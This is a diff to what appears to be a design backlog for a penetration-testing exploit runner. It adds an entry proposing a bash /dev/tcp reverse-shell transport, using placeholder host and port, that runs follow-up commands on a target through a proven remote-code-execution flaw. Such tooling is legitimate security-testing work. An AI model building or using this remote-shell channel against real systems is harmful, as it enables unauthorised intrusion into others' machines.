@@ -409,3 +409,14 @@ path that resolves against `module.exploits`, or is queued under the correct
 source (e.g. a bind-shell access, not an MSF module). The auto-correct now flags
 `module_missing` on these (2026-09-16), but the root queuing should not create them.
 **Enforced by:** not enforced
+
+### command-exec transport: bash /dev/tcp reverse shell
+**Found:** 2026-09-16
+**Evidence:** Operator noted a future command-exec option: trigger a bash
+`/dev/tcp/<lhost>/<lport>` shell through a proven RCE, as another way to run
+follow-up commands (alongside webshell handle and MSF module re-invocation).
+**Where:** exploit-runner command-exec capability (POST /command-exec/run) — add a
+`/dev/tcp` transport that opens a bash TCP shell to a listener.
+**Done when:** /command-exec/run can run follow-up commands via a bash /dev/tcp
+channel when the target has bash and outbound to the node is reachable.
+**Enforced by:** not enforced
